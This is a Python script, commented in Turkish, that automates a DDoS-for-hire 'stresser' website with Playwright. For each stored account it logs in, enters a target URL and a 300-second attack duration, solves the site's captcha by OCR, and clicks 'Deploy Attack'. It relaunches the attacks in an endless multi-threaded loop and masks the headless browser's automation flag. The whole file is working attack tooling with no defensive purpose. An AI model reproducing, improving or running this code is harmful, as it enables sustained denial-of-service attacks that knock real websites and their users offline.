import threading
import time
import os
import re
import base64
import io
import shutil
import sys
import logging
from datetime import datetime
from playwright.sync_api import sync_playwright, TimeoutError as PlaywrightTimeout
from PIL import Image
import ddddocr

# ============================================================
# LOG AYARLARI
# ============================================================
LOG_DIR = "logs"
if not os.path.exists(LOG_DIR):
    os.makedirs(LOG_DIR)

log_filename = f"{LOG_DIR}/ddos_log_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log"

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s | %(message)s',
    datefmt='%H:%M:%S',
    handlers=[
        logging.FileHandler(log_filename, encoding='utf-8'),
        logging.StreamHandler(sys.stdout)
    ]
)
logger = logging.getLogger(__name__)

ocr = ddddocr.DdddOcr()

# ============================================================
# ANA SINIF
# ============================================================
class DDoSNowManager:
    def __init__(self):
        self.base_url = "https://stresser.ba"
        self.accounts = self.load_accounts()
        self.running_states = {}
        self.stop_events = {}
        self.active_threads = {}
        logger.info("=== PROGRAM BAŞLADI ===")
        logger.info(f"Site: {self.base_url}")

    def load_accounts(self):
        accounts = []
        if not os.path.exists("accounts.txt"):
            with open("accounts.txt", "w") as f:
                f.write("test:pass:https://example.com\n")
            logger.warning("accounts.txt oluşturuldu!")
            return []
        with open("accounts.txt", "r") as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith("#"):
                    p = line.split(":", 2)
                    if len(p) == 3:
                        accounts.append({"id": str(len(accounts)+1), "user": p[0], "pass": p[1], "target": p[2]})
                        logger.info(f"Hesap yüklendi: {p[0]} -> {p[2]}")
        return accounts

    def is_login_page(self, page):
        return "/login" in page.url

    def do_login(self, page, username, password):
        try:
            logger.info(f"[{username}] 🔐 Login yapılıyor...")
            page.goto(f"{self.base_url}/login", timeout=60000)
            page.wait_for_load_state("domcontentloaded", timeout=30000)
            time.sleep(1)

            page.fill("input[name='username']", username, timeout=15000)
            page.fill("input[name='password']", password, timeout=15000)
            page.click("button[type='submit']", timeout=15000)
            time.sleep(3)

            try:
                got_it = page.locator("button:has-text('Got it')").first
                if got_it.count() > 0:
                    got_it.click()
                    time.sleep(0.5)
            except:
                pass

            return True
        except Exception as e:
            logger.error(f"[{username}] ❌ Login hatası: {e}")
            return False

    def go_to_hub(self, page, username):
        try:
            page.goto(f"{self.base_url}/hub", timeout=60000)
            page.wait_for_load_state("domcontentloaded", timeout=30000)
            time.sleep(1)

            if self.is_login_page(page):
                logger.warning(f"[{username}] ⚠️ Hub'a giderken login düşüldü!")
                return False

            logger.info(f"[{username}] ✅ Hub aktif")
            return True
        except Exception as e:
            logger.error(f"[{username}] ❌ Hub hatası: {e}")
            return False

    def solve_captcha(self, page, username, max_attempts=10):
        """Captcha çöz - HIZLI, tüm denemeler loglanır, aynı image atlanır"""
        seen_images = set()  # Aynı captcha tekrar okunmasın

        for attempt in range(1, max_attempts + 1):
            try:
                img_elem = page.locator("img[alt='captcha']").first
                if img_elem.count() == 0:
                    logger.warning(f"[{username}] 🔑 OCR deneme {attempt}/{max_attempts}: Captcha image yok")
                    time.sleep(0.5)
                    continue

                img_src = img_elem.get_attribute("src")
                if not img_src or not img_src.startswith("data:image"):
                    logger.warning(f"[{username}] 🔑 OCR deneme {attempt}/{max_attempts}: Captcha src geçersiz")
                    time.sleep(0.5)
                    continue

                # Aynı image tekrar okunmasın
                if img_src in seen_images:
                    logger.warning(f"[{username}] 🔑 OCR deneme {attempt}/{max_attempts}: Aynı image tekrar, bekleniyor...")
                    time.sleep(1)
                    continue
                seen_images.add(img_src)

                base64_data = re.sub(r'^data:image/\w+;base64,', '', img_src)
                img_bytes = base64.b64decode(base64_data)
                img = Image.open(io.BytesIO(img_bytes))

                captcha_text = ocr.classification(img)
                captcha_text = re.sub(r'[^A-Z0-9]', '', captcha_text.upper())

                if len(captcha_text) < 3:
                    logger.warning(f"[{username}] 🔑 OCR deneme {attempt}/{max_attempts}: Çok kısa sonuç '{captcha_text}'")
                    time.sleep(0.5)
                    continue

                logger.info(f"[{username}] 🔑 OCR deneme {attempt}/{max_attempts}: {captcha_text}")

                captcha_input = page.locator("input[name='captcha']").first
                if captcha_input.count() == 0:
                    logger.warning(f"[{username}] 🔑 OCR deneme {attempt}/{max_attempts}: Input yok")
                    time.sleep(0.5)
                    continue

                captcha_input.fill("")
                time.sleep(0.2)
                captcha_input.fill(captcha_text)
                time.sleep(0.3)

                deploy_btn = page.locator("button[type='submit'][form='hubForm']").first
                if deploy_btn.count() == 0:
                    deploy_btn = page.locator("button.btn-confirm:has-text('Deploy Attack')").last
                if deploy_btn.count() == 0:
                    logger.warning(f"[{username}] 🔑 OCR deneme {attempt}/{max_attempts}: Deploy butonu yok")
                    time.sleep(0.5)
                    continue

                deploy_btn.click()
                time.sleep(1.5)  # Mesajların çıkması için kısa bekle

                # Hata mesajı var mı?
                if page.locator("text=Invalid captcha code").count() > 0:
                    logger.warning(f"[{username}] ❌ YANLIŞ: {captcha_text} (deneme {attempt})")
                    try:
                        page.locator("text=Invalid captcha code").first.evaluate("el => el.remove()")
                    except:
                        pass
                    time.sleep(0.5)
                    continue

                # Başarı mesajı var mı?
                if page.locator("text=Attack Launched").count() > 0 or page.locator(".Toastify__toast--success").count() > 0:
                    logger.info(f"[{username}] ✅ DOĞRU: {captcha_text} | Attack başlatıldı!")
                    return True

                # Badge var mı?
                badge = page.locator(".accordion-button .badge").first
                running = page.locator(".stats-content .badge:has-text('Running')").first
                if badge.count() > 0 or running.count() > 0:
                    logger.info(f"[{username}] ✅ DOĞRU: {captcha_text} | Attack aktif!")
                    return True

                # Belirsiz - yeniden dene
                logger.warning(f"[{username}] 🔑 OCR deneme {attempt}/{max_attempts}: Belirsiz durum, yeniden deneniyor")
                time.sleep(0.5)
                continue

            except Exception as e:
                logger.error(f"[{username}] ⚠️ Captcha exception (deneme {attempt}): {e}")
                time.sleep(1)
                continue

        logger.error(f"[{username}] 💀 {max_attempts} deneme sonucu captcha çözülemedi!")
        return False

    def browser_worker(self, acc_id, target_url, account_data):
        username = account_data["user"]
        password = account_data["pass"]
        profile_dir = os.path.join(os.getcwd(), f"profiles/profile_{username}")
        stop_event = self.stop_events.get(acc_id)

        logger.info(f"[{username}] 🚀 Worker başladı | Hedef: {target_url}")

        while self.running_states.get(acc_id, False):
            try:
                if os.path.exists(profile_dir):
                    shutil.rmtree(profile_dir, ignore_errors=True)
                os.makedirs(profile_dir, exist_ok=True)

                with sync_playwright() as p:
                    context = p.chromium.launch_persistent_context(
                        user_data_dir=profile_dir,
                        headless=True,
                        args=[
                            '--no-sandbox',
                            '--disable-setuid-sandbox',
                            '--disable-dev-shm-usage',
                            '--disable-gpu',
                            '--disable-software-rasterizer'
                        ],
                        viewport={"width": 1280, "height": 720},
                        user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
                    )
                    page = context.new_page()
                    page.add_init_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined});")

                    # İlk login
                    if not self.do_login(page, username, password):
                        time.sleep(30)
                        continue

                    if not self.go_to_hub(page, username):
                        time.sleep(30)
                        continue

                    # ANA DÖNGÜ
                    attack_count = 0
                    last_time_log = 0

                    while self.running_states.get(acc_id, False) and not (stop_event and stop_event.is_set()):
                        try:
                            attack_count += 1
                            logger.info(f"[{username}] 🚀 Attack #{attack_count} başlatılıyor...")

                            # Login kontrolü
                            if self.is_login_page(page):
                                logger.warning(f"[{username}] ⚠️ Login sayfası tespit edildi! Yeniden giriş...")
                                if not self.do_login(page, username, password):
                                    time.sleep(10)
                                    continue
                                if not self.go_to_hub(page, username):
                                    time.sleep(10)
                                    continue

                            # 1. URL gir
                            target_input = page.locator("input[name='hub.0.host']").first
                            if target_input.count() == 0:
                                logger.error(f"[{username}] ❌ URL input yok! Yenileniyor...")
                                page.reload()
                                time.sleep(3)
                                continue

                            target_input.fill("")
                            time.sleep(0.3)
                            target_input.fill(target_url)
                            logger.info(f"[{username}] 🎯 URL: {target_url}")

                            # 2. Süre inputu
                            try:
                                time_input = page.wait_for_selector("input[name='hub.0.time']", timeout=15000)
                            except PlaywrightTimeout:
                                logger.error(f"[{username}] ❌ Süre input açılmadı! Yenileniyor...")
                                page.reload()
                                time.sleep(3)
                                continue

                            time_input.fill("")
                            time.sleep(0.3)
                            time_input.fill("300")
                            logger.info(f"[{username}] ⏱️ Süre: 300s")

                            # 3. Deploy
                            deploy_btn = page.locator("button.btn-confirm:has-text('Deploy Attack')").first
                            if deploy_btn.count() == 0:
                                deploy_btn = page.locator("button:has-text('Deploy Attack')").first
                            if deploy_btn.count() == 0:
                                logger.error(f"[{username}] ❌ Deploy butonu yok! Yenileniyor...")
                                page.reload()
                                time.sleep(3)
                                continue
                            deploy_btn.click()
                            time.sleep(1)

                            # 4. Captcha çöz
                            if not self.solve_captcha(page, username, max_attempts=10):
                                logger.error(f"[{username}] 💀 Captcha başarısız! Sayfa yenileniyor...")
                                page.reload()
                                time.sleep(3)
                                continue

                            logger.info(f"[{username}] 🚀 Attack #{attack_count} BAŞLADI!")

                            # 🔥 BEKLE: Attack'ın DOM'a yansıması için 5 saniye bekle
                            time.sleep(5)

                            # 5. Süre takibi
                            while self.running_states.get(acc_id, False) and not (stop_event and stop_event.is_set()):
                                try:
                                    badge = page.locator(".accordion-button .badge").first
                                    if badge.count() > 0:
                                        t = badge.text_content().strip()
                                        if not t or t in ["0m 0s", "0s", "0", ""]:
                                            logger.info(f"[{username}] ⏱️ Süre doldu!")
                                            break
                                        now = time.time()
                                        if now - last_time_log >= 30:
                                            logger.info(f"[{username}] ⏱️ Kalan: {t}")
                                            last_time_log = now
                                    else:
                                        running = page.locator(".stats-content .badge:has-text('Running')").first
                                        if running.count() == 0:
                                            # Henüz başlamamış olabilir, 3 sn daha bekle
                                            time.sleep(3)
                                            running = page.locator(".stats-content .badge:has-text('Running')").first
                                            if running.count() == 0:
                                                logger.info(f"[{username}] ✅ Attack bitti!")
                                                break
                                except Exception as e:
                                    logger.warning(f"[{username}] ⚠️ Süre takip hatası: {e}")
                                    pass
                                time.sleep(5)

                            if not self.running_states.get(acc_id, False):
                                break

                            # 6. Yeniden başlat
                            logger.info(f"[{username}] 🔄 Yeniden başlatılıyor...")
                            page.reload()
                            time.sleep(3)

                            if self.is_login_page(page):
                                logger.warning(f"[{username}] ⚠️ Reload sonrası login düşüldü! Yeniden giriş...")
                                if not self.do_login(page, username, password):
                                    time.sleep(10)
                                    continue
                                if not self.go_to_hub(page, username):
                                    time.sleep(10)
                                    continue

                        except Exception as e:
                            logger.error(f"[{username}] ❌ İşlem hatası: {e}")
                            page.reload()
                            time.sleep(5)
                            continue

                    context.close()

            except Exception as e:
                logger.error(f"[{username}] 💥 KRİTİK HATA: {e}")
                time.sleep(10)
                continue

        logger.info(f"[{username}] 🛑 Durduruldu")
        self.running_states[acc_id] = False

    def start_all(self):
        if not self.accounts:
            logger.error("Hiç hesap yok!")
            return

        logger.info(f"{len(self.accounts)} hesap başlatılıyor...")
        for acc in self.accounts:
            acc_id = acc["id"]
            target = acc.get("target", "https://example.com")
            self.running_states[acc_id] = True
            self.stop_events[acc_id] = threading.Event()
            t = threading.Thread(target=self.browser_worker, args=(acc_id, target, acc), daemon=True)
            self.active_threads[acc_id] = t
            t.start()
            logger.info(f"[{acc['user']}] 🚀 Başlatıldı -> {target}")
            time.sleep(3)

        while True:
            time.sleep(60)
            logger.info("="*60)
            logger.info("AKTİF HESAPLAR:")
            for acc in self.accounts:
                acc_id = acc["id"]
                status = "🟢 Çalışıyor" if self.running_states.get(acc_id, False) else "🔴 Durduruldu"
                logger.info(f"  {acc['user']}: {status} -> {acc.get('target', '?')}")
            logger.info("="*60)

if __name__ == "__main__":
    print("""
    ╔═══════════════════════════════════════════╗
    ║   IPBOOTER.BA - DDOS AUTOMATION           ║
    ╚═══════════════════════════════════════════╝
    """)
    manager = DDoSNowManager()
    manager.start_all()
